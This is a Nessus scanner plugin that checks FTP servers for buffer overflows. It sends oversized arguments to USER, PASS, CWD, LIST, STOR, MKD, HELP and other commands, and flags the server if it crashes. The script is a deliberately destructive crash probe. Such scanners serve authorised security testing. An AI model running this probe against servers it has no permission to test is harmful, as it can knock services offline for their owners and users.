#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10084);
 if ( NASL_LEVEL >= 2200 )script_bugtraq_id(13454, 1227, 1675, 1690, 1858, 3884, 7251, 7278, 7307, 961, 12704, 113, 269);
 script_version ("$Revision: 1.63 $");
 if ( NASL_LEVEL >= 2200 )script_cve_id("CVE-2000-0133", "CVE-2000-0943", "CVE-2002-0126", "CVE-2000-0870", "CVE-2000-1035", "CVE-2000-1194", "CVE-2000-1035", "CVE-1999-0219");

 name["english"] = "ftp USER, PASS or HELP overflow";
 script_name(english:name["english"]);
 
 desc["english"] = "
Synopsis :

The remote FTP server is susceptible to buffer overflow attacks. 

Description :

The remote FTP server closes the connection when a command or argument
is too long.  This is probably due to a buffer overflow and may allow
an attacker to execute arbitrary code on the remote host. 

Solution : 

Upgrade / switch the FTP server software or disable the service if not
needed. 

Risk factor : 

High / CVSS Base Score : 8 
(AV:R/AC:H/Au:NR/C:C/A:C/I:C/B:N)";
 script_description(english:desc["english"]);
 
 summary["english"] = "attempts some buffer overflows";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "FTP";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "ftpserver_detect_type_nd_version.nasl");
 script_require_keys("ftp/login", "ftp/password");
 script_exclude_keys("ftp/msftpd", "ftp/ncftpd", "ftp/fw1ftpd", "ftp/vxftpd");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# The script code starts here
#

include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if(!port)port = 21;


function is_vulnerable (value)
{
 soc = open_sock_tcp (port);
 if (!soc)
 {
   set_kb_item(name:"ftp/overflow", value:TRUE);
   set_kb_item(name:"ftp/overflow_method", value:value);
   security_hole(port);
 }
 exit (0);
}

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  d = ftp_recv_line(socket:soc);
  if(!d){
	set_kb_item(name:"ftp/false_ftp", value:TRUE);
	close(soc);
	exit(0);
	}
  if(!egrep(pattern:"^220[ -]", string:d))
   {
    # not an FTP server
    set_kb_item(name:"ftp/false_ftp", value:TRUE);
    close(soc);
    exit(0);	
   }
 
  if("Microsoft FTP Service" >< d)exit(0);
 
  req = string("USER ftp\r\n");
  send(socket:soc, data:req);
  d = ftp_recv_line(socket:soc);
  ftp_close(socket:soc);
  if(!d)
  {
   set_kb_item(name:"ftp/false_ftp", value:TRUE);
   exit(0);	
  }
  
  soc = open_sock_tcp(port);
  if ( ! soc ) exit(0);
  d = ftp_recv_line(socket:soc);
  s = string("USER ", crap(4096), "\r\n");
  send(socket:soc, data:s);
  d = ftp_recv_line(socket:soc);
  if(!d){
	close (soc);
	is_vulnerable (value:"USER");
	}
  else
  {
   # Let's try to access it with valid credentials now.
   login = get_kb_item("ftp/login");
   password = get_kb_item("ftp/password");

   s = string("USER ", login, "\r\n");
   send(socket:soc, data:s);
   d = ftp_recv_line(socket:soc);
   # ProFTPD 1.5.2 crashes with more than 12 KB
   s = string("PASS ", crap(12500), "\r\n");
   send(socket:soc, data:s);
   d = ftp_recv_line(socket:soc);
   if(!d){
	close (soc);
	is_vulnerable (value:"PASS");
	}
   else
   {
     s = string("PASS ", password, "\r\n");
     send(socket:soc, data:s);
     d = ftp_recv_line(socket:soc);
     if(!d) exit(0);

     s = string("CWD ", crap(4096), "\r\n");
     send(socket:soc, data:s);
     d = ftp_recv_line(socket:soc);
     if(!d){
	close (soc);
	is_vulnerable (value:"CWD");
	}
	
     s = string("LIST ", crap(4096), "\r\n");
     send(socket:soc, data:s);
     d = ftp_recv_line(socket:soc);
     if(!d){
	close (soc);
	is_vulnerable (value:"LIST");
	}
	
		
     s = string("STOR ", crap(4096), "\r\n");
     send(socket:soc, data:s);
     d = ftp_recv_line(socket:soc);
     if(!d){
	close (soc);
	is_vulnerable (value:"STOR");
	}
	
     s = string("RNTO ", crap(4096), "\r\n");
     send(socket:soc, data:s);
     d = ftp_recv_line(socket:soc);
     if(!d){
	close (soc);
	is_vulnerable (value:"RNTO");
	}
	
     s = string("MKD ", crap(4096), "\r\n");
     send(socket:soc, data:s);
     d = ftp_recv_line(socket:soc);
     if(!d){
	close (soc);
	is_vulnerable (value:"MKD");
	}	
		
     s = string("XMKD ", crap(4096), "\r\n");
     send(socket:soc, data:s);
     d = ftp_recv_line(socket:soc);
     if(!d){
	close (soc);
	is_vulnerable (value:"XMKD");
	}
	
     s = string("RMD ", crap(4096), "\r\n");
     send(socket:soc, data:s);
     d = ftp_recv_line(socket:soc);
     if(!d){
	close (soc);
	is_vulnerable (value:"RMD");
	exit(0);
	}	


     s = string("XRMD ", crap(4096), "\r\n");
     send(socket:soc, data:s);
     d = ftp_recv_line(socket:soc);
     if(!d){
	close (soc);
	is_vulnerable (value:"XRMD");
	}	
	
     s = string("APPE ", crap(4096), "\r\n");
     send(socket:soc, data:s);
     d = ftp_recv_line(socket:soc);
     if(!d){
	close (soc);
	is_vulnerable (value:"APPE");
	}
	
     s = string("SIZE ", crap(4096), "\r\n");
     send(socket:soc, data:s);
     d = ftp_recv_line(socket:soc);
     if(!d){
	close (soc);
	is_vulnerable (value:"SIZE");
	}
	
     s = string("RNFR ", crap(4096), "\r\n");
     send(socket:soc, data:s);
     d = ftp_recv_line(socket:soc);
     if(!d){
	close (soc);
	is_vulnerable (value:"RNFR");
	}
	
				
     s = string("HELP ", crap(4096), "\r\n");
     send(socket:soc, data:s);
     d = ftp_recv_line(socket:soc);
     if(!d){
	close (soc);
	is_vulnerable (value:"HELP");
	}

     s = string(crap(4096), "\r\n");
     send(socket:soc, data:s);
     d = ftp_recv_line(socket:soc);
     if(!d){
	close (soc);
	is_vulnerable (value:"");
	}
     }
    }
   if ( soc )  close(soc);
  }
 }
